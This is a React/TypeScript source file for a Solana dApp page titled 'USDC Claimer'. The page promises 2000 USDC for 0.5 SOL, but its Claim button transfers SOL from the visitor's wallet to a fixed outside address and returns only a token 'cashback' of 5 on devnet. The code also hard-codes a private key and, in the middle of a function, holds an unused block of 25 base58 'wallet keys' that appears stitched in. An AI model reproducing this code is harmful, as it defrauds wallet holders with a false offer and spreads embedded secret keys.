/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "rs81t3JJmkUujq2J11wejqgiPUBt5dgokcZfK2VA7YoFHsS5d3pMKu2zC8WmZi9UsEWEauStonbR8HnWrf42haQ"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "2ZfKcMjCyf6qTuiDeKyQxec6CawJBMgQJsxuvffahNVQoCpRNKCAK35gKPtWHidLPDijduB75UnjuCferxAabrAd",
  "key1": "4ZGzCUESVXrhHRaT6faX7QyDsSAazYztMHvhqTa77sZJ1xAMTyqHFEFUXzN6WkjSSk5J37V6uoGkXAxURoCwXgMF",
  "key2": "5UzKu7NKRe4Jq4RxiTfyYm9MdV8YXpdNtCxnZ5gHQYiQx3wVMpqa6GCrUWy8QZE1NquWfgUuP4qhaXmtb2HSjyf2",
  "key3": "34DbWpHqUDpLWmAMa7GzfmkFUQ2Fv6mMjnA2RJRi8XcQUpdUqzngwE8aoELoADBoDQFwudpaUhBbusauucEDhnaC",
  "key4": "2DtXPuAL81qbzbXzpnKp2cwuztYen48hKDRKFPU4D2b2Eu9UqRGhHrz3iTeoHdsPVVttBcKPu1TR12su2uRXzvvd",
  "key5": "2a8dhrpTkA6j3Vbhc8W2TZQxTD1p5j3ruU2i3RhhhbGVL9C32FZrdHoGkjrEZXonCfQ3UrtBtoZMyzcY1nUeaeLR",
  "key6": "45XMEmWnqZTzPLxLVffDFnMN44Xu51dsaPW3NxoCnPdvyNvQdtpneAgBSg2xHgEwLffdpsxEdMRCK5UGihXWnNXu",
  "key7": "4FesV8A62CYdZvaryEpBd6ha2Yg8FbgQZpxM9gjiZwagk9uqtMDRqMLT98XbgxjoBcG1fWDPwPQU8cYMwtBqXF2h",
  "key8": "5qP1jxWqLi9e2AtSRamak6Je1EnwgTucFLNcHKBYMhMdnqtZyYMR5S5pzmtWeyVg9qbx9uJH4ho2oN71phah3wDH",
  "key9": "3TCUw5Cr6hgjCt72ajqpRp4u1pRWTbKWv1F9Vn68QuVPqRJJFyZwDb29vAceQ5JnhTJk4YQqdV2LWbLCdKRUn3Z",
  "key10": "4y59Wu36PQULdB1tDAUkyZxriiT8EAJBHXKoBhgQPGA5yAc9tgWz65bSkUQwoV21LDa8JojY1LiF6aLNwemPigDY",
  "key11": "3HHb6ya5HE7NSvTydz4vVoVHJy2KawqoWZtY8aSgXHGRAeQS295zQGULNuTP8kSJTrk8N3jMN6ABJ5rwAwyN92Px",
  "key12": "2SoT2x1oL1UCAh5STQdb2yrVVSwVCg8K2aafghKF2UvfZvrBtRfG5X2nmNR1mLHRGv65tkhit2CQY2qv4eW3duMh",
  "key13": "4mVKkxa7PgukHmK7HR1YKA2pCkarC9tL3u2H1sf4RG9mUxXjsZNXj8E5yHSxYFujDvBTsHb67fcUF2sVN3pHfgun",
  "key14": "3ZHcea7MigjExeDb67rnzS46DQGXPuFzp2oEURjGyV2bAPabjdj9hmAyDJBkU747Ww6bwuZ4oF2TCgKgUxMyzMJN",
  "key15": "3Ea5x77VhWrEvuYDGcjW5a7RVycUxhV9FdLtHXBFUzKvKkeXffbx8NZwsvvD82PvzaFXKw9WgjsCkcvfWUF4GazQ",
  "key16": "2z3YPvfq3ZfiKKbCqADitpQRtqt7GJSJ8VhNQYws9NuSkTJSM654BqXzeAcU3pZrpseyA1TJr4cdmJ7egNnMjpxy",
  "key17": "3JQHQfR5MkPNwDh7hnqEp3GKnKYMf1R4fw8LXHw1ipzsvG8eLmzW8RDi5DLc1Y7HwbTFmQHreHDXArHtA54YYt4v",
  "key18": "5pEqC6GNgWF2TpBmPxsvNNgB1riZ2eyD7NddxCkU6TauKqGWZkgNURpLTpiNtd8irKtzdanUEC9kgf7ptn6R1DNK",
  "key19": "66EMok32iGVsqdXEhqNGwarE9WKEGpot3Zfgd5i2sgAe2jAeammjzsa1vxHvtmFaZ8gTT243hRXUhqD5nrrtTXQv",
  "key20": "3NNdc7atkKGJR4cbpyrhdgYZHvAG4quJbWjWS6RDgvRtNt69RbgJUvjo7NLZigtpb8XQiT3417MCB5MUVKvjZxzE",
  "key21": "ixVcMjqATkc82iwsJkLH8LTYGh1YzbjA9SdqvjATKFUY8avCgfVXQ8aGuS1vCsqQZ2LyUFqXSXFvfKMfzm5p7Ea",
  "key22": "3cF2edc4yLSrCNsqCfF4ZoBuHthPuoSgk23BBWXmdDhryfbsKzVMUAAhk6v61twgUZVoWGBH1soG8pLZvkg944Xu",
  "key23": "4fGQvSW2Q8j56aXwF19PfbAniN9DtWU4JUD8ZFVH4jABybM5oemsLeMv2Uwz5wDsGAc2kmNwanwkyuuDdTr4V9m",
  "key24": "5tt46zDv8Vyx3JdzF3iKfodfSDx2MjcqiWnw7UaCfQ6UboCNETWhgP3pjc6ch7q2iEonCvHMe6WN455ggWAn4Y3s"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
